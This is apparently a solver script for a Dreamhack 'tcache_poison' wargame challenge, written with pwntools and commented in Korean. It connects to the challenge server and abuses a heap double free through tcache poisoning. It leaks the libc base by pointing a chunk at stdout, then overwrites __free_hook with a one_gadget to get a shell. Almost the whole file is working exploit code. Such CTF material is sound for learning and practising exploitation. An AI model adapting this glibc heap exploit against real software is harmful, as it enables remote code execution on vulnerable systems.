from pwn import *
# p = process('./tcache_poison')
p = remote('host3.dreamhack.games', 21298)
e = ELF('./tcache_poison')
libc = ELF('./libc-2.27.so')

def slog (sym, addr):
    return success(sym + ' : ' + hex(addr))
def alloc(size, chunk):
    p.sendlineafter(b'Edit\n', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Content: ', chunk)
def free():
    p.sendlineafter(b'Edit\n', b'2')  
def print():
    p.sendlineafter(b'Edit\n', b'3')
def edit(data):
    p.sendlineafter(b'Edit\n', b'4')
    p.sendlineafter(b'chunk: ', data)

addr_stdout = e.symbols['stdout']

# 초기 tcache[0x40]은 비어있다.
# tcache[0x40]: chunk A로 만들자!
alloc(0x30, b'aaaa')
free()
# chunk A를 또 free하고 싶다. chunk의 key를 수정해서, 또 free시켜보자!
edit(b'B'*8 + b'\x00')
free()


# 변수 stdout의 주소를 tcache에 넣고 싶다!
addr_stdout = e.symbols['stdout']
alloc(0x30, p64(addr_stdout)) 
## tcache[0x40]: stdout -> _IO_2_1_stdout_ -> ...
alloc(0x30, b'b') # 현재 chunk는 _IO_2_1_stdout에 위치한다.

_io_2_1_stdout = p64(libc.symbols['_IO_2_1_stdout_'])[0:1]
alloc(0x30, _io_2_1_stdout) #이제 stdout에 allocated 되었다.

print()
p.recvuntil(b'Content: ')
stdout = u64(p.recv(6).ljust(8, b'\x00'))
lb = stdout - libc.symbols['_IO_2_1_stdout_']
free_hook = lb + libc.symbols['__free_hook']
onegadget = lb + 0x4f432

slog('libc base', lb)
alloc(0x40, b'dreamhack')
free()
edit(b'C'*8 + b'\x00')
free() # 이제 double free 가능

alloc(0x40, p64(free_hook))
alloc(0x40, b'D'*8) # 이제 chunk[0x50]은 free_hook에 위치한다.
alloc(0x40, p64(onegadget)) # free_hook이 one_gadget이 된다.

free()

p.interactive()